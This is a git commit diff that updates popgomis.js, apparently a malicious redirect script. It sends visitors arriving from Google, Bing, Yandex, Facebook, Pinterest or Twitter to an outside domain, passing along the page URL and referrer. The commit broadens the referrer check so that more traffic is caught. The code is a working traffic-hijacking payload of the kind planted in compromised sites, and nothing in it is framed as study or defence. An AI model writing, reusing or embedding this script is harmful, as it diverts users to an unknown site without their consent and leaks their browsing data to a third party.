d9ec46bd83a63ac9572cab9428c317f702f80872
andromang <66984579+andromang@users.noreply.github.com>
2024-01-13 07:04:52 +0800

    Update popgomis.js

--- popgomis.js
+++ popgomis.js
@@ -1,3 +1,3 @@
 var ars = 'https://www.missfixtrix.com';
 
-if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'twitter.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 't.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
